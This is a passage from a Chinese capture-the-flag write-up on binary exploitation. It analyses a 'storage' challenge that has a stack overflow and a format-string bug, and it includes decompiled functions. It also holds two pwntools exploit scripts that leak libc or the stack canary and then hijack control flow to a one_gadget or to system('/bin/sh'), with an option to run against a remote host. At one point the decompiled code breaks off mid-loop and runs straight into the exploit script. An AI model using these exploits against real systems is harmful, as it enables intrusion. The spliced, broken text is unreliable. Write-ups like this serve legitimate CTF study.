        gdb.attach(con,commond)
    def exploit():
        con.sendlineafter("Login: ","admin")
        con.sendlineafter("Password: ","password")
        code="d"*(0x60-3)+"pd"*4+"g"+"gd"*4
        code+=code.count("d")*"u"
        code+="p"
        #z("b *0x08049587")
        #z("b *0x8049574")
        con.sendafter("here: ",code)   
        data=""
        data+=con.recv(1)
        data+=con.recv(1)
        data+=con.recv(1)
        data+=con.recv(1)
        libc.address=u32(data[::-1])-libc.symbols['__isoc99_scanf']
        success("Libc: "+hex(libc.address))
        one_gadget=0x6729f
        #one_gadget=0x5fbc5
        addr=p32(libc.address+one_gadget)[::-1]
        con.send(addr)
    exploit()
    con.interactive()
## storage
本地考查 栈溢出，格式化字符串漏洞
### 题目分析
> Arch: i386-32-little  
>  RELRO: Partial RELRO  
>  Stack: No canary found  
>  NX: NX enabled  
>  PIE: No PIE (0x8048000)
这题是个静态链接的程序，实际开了canary保护。  
这题是一个文件系统，有六个功能
> Select option:
>
>   1. Download file
>   2. Upload file
>   3. List files
>   4. Sign file
>   5. Add file info
>   6. View file info
>   7. Exit
>
>>
分别是展示文件，添加文件，显示文件列表，对文件签名，添加文件信息，展示文件信息。  
由于程序的小功能比较多，这边只展示有漏洞的函数了。  
首先由于程序会对文件名做一个过滤，过滤了`/`和`.`,所以显然无法直接通过目录穿越去读文件。我们先标一下系统函数，然后逐个功能审计一下，发现添加文件信息功能有问题。
    unsigned int addinfo()
    {
      char *v0; // eax
      char *v1; // eax
      int v2; // ecx
      unsigned int result; // eax
      unsigned int v4; // et1
      int file; // [esp+4h] [ebp-244h]
      int v6; // [esp+8h] [ebp-240h]
      int v7; // [esp+8h] [ebp-240h]
      int v8; // [esp+8h] [ebp-240h]
      char v9; // [esp+Ch] [ebp-23Ch]
      char v10[32]; // [esp+1Ch] [ebp-22Ch]
      char v11[128]; // [esp+3Ch] [ebp-20Ch]
      char v12[128]; // [esp+BCh] [ebp-18Ch]
      char v13[256]; // [esp+13Ch] [ebp-10Ch]
      unsigned int v14; // [esp+23Ch] [ebp-Ch]
      v14 = __readgsdword(0x14u);
      sub_8049088(v11, 0, 128);
      printf("Enter the filename: ");
      flush(stdin);
      flush(off_80F84BC);
      sub_8053050("%16s", (unsigned int)&v9);
      sub_804AAB8(&v9);
      if ( !sub_804A9E5(&v9) )
      {
        puts("[-] File is not exist!");
        sub_8051FC0(-1234);
      }
      v0 = &v11[strlen(v11)];
      *(_DWORD *)v0 = 1868983913;
      *((_WORD *)v0 + 2) = 47;
      sub_8049060(v11, &v9);
      v1 = &v11[strlen(v11)];
      *(_DWORD *)v1 = 1718511967;
      *((_DWORD *)v1 + 1) = 2020879983;
      *((_WORD *)v1 + 4) = 116;
      file = open(v11, "w");
      if ( file )
      {
        printf("Enter the file owner name: ");
        flush(stdin);
        v6 = read(0, v10, 512);
        if ( v6 > 0 )
        {
          v10[v6] = 0;
          writeintofile(v10, file);
        }
        printf("Enter the file create date: ");
        flush(stdin);
        v7 = read(0, v12, 512);
        if ( v7 > 0 )
        {
          v12[v7] = 0;
          writeintofile(v12, file);
        }
        printf("Enter the file owner name: ");
        flush(stdin);
        v8 = read(0, v13, 512);
        if ( v8 > 0 )
        {
          v13[v8] = 0;
          writeintofile(v13, file);
        }
        close(file);
      }
      else
      {
        puts("[-] Error in file open!");
      }
      v4 = __readgsdword(0x14u);
      result = v4 ^ v14;
      if ( v4 != v14 )
        sub_8074200(v2);
      return result;
    }
这里调用了read功能三次，大小都是512，但是栈上对应的buff的空间都不足512。而且最后一次从输入中读取内容到v13时，v13的大小只有256，而且v13离canary很近，可以利用这个漏洞直接栈溢出，修改返回地址进行ROP。  
要做栈溢出，还需要泄露canary的值以绕过canary保护。我们再审计程序中所有的输出功能，发现在文件签名过程中有一个printf的值是和我们的输入相关的。看一下文件签名的过程：
    signed int sign()
    {
      int v0; // eax
      signed int result; // eax
      int v2; // ST04_4
      int v3; // ecx
      unsigned int v4; // et1
      int i; // [esp+8h] [ebp-300h]
      signed int j; // [esp+Ch] [ebp-2FCh]
      signed int k; // [esp+10h] [ebp-2F8h]
      int v8; // [esp+14h] [ebp-2F4h]
      int v9; // [esp+18h] [ebp-2F0h]
      int v10; // [esp+1Ch] [ebp-2ECh]
      char v11; // [esp+20h] [ebp-2E8h]
      char v12; // [esp+7Ch] [ebp-28Ch]
      char v13[16]; // [esp+8Ch] [ebp-27Ch]
      char v14[16]; // [esp+9Ch] [ebp-26Ch]
      char v15[16]; // [esp+ACh] [ebp-25Ch]
      int v16; // [esp+BCh] [ebp-24Ch]
      __int16 v17; // [esp+C0h] [ebp-248h]
      char v18; // [esp+C2h] [ebp-246h]
      char v19[512]; // [esp+FCh] [ebp-20Ch]
      unsigned int v20; // [esp+2FCh] [ebp-Ch]
      v20 = __readgsdword(0x14u);
      printf("Enter the filename: ");
      flush(stdin);
      scanf("%16s", (unsigned int)&v12);
      sub_804AAB8(&v12);
      v16 = 1701603686;
      v17 = 12147;
      v18 = 0;
      sub_8049060(&v16, &v12);
      v8 = open(&v16, "rb");
      if ( v8 )
      {
        for ( i = 0; ; ++i )
        {
          v9 = sub_8055660(v8);
          if ( v9 == -1 )
            break;
          v19[i] = v9;
        }
        v19[i] = 0;
        close(v8);
        printf("Enter the signer name: ");
        flush(stdin);
        scanf("%16s", (unsigned int)v13);
        printf("filedata: %s\n");
        flush(stdin);
        sub_804AE40(&v11);
        v0 = sub_8070780(v19);
        sub_804AB90(&v11, v19, v0);
        sub_804AD20(v14, &v11);
        printf("File hash: ");
        flush(stdin);
        for ( j = 0; j 2:
        con=remote(sys.argv[1],int(sys.argv[2]))
        #libc=ELF("./libc.so")
    elif len(sys.argv)>1:
        libc = ELF(sys.argv[1])
        con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
    else:
        con=code.process()
        if(context.arch == "amd64"):
            libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
        else:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6")
    def z(commond=""):
        gdb.attach(con,commond)
    def exploit():
        con.sendlineafter("Login: ","admin")
        con.sendlineafter("Password: ","admin")
        con.sendlineafter("> ","2")
        con.sendlineafter("filename: ","aa")
        con.sendlineafter("data: ","a")
        filehash="60b725f10c9c85c70d97880dfe8191b3".decode("hex")
        payload="%195$p\x00"
        signname=""
        for i,x in enumerate(payload):
            signname+=chr(ord(x)^ord(filehash[i])) 
        con.sendlineafter("> ","4")
        con.sendlineafter("filename: ","aa")
        con.sendlineafter("name: ",signname)
        con.recvuntil("File sign: ")
        canary = int(con.recvline().strip(),16)
        con.sendlineafter("> ","5")
        con.sendlineafter("filename: ","aa")
        con.sendlineafter("name: ","aa")
        #z()
        con.sendlineafter("date: ","aa")
        system = 0x8052CF0
        sh = 0x080C7B8C
        con.sendlineafter("name: ","a"*0x100+p32(canary)+p32(0)*3+p32(system)+p32(0)+p32(sh))
    exploit()
    con.interactive()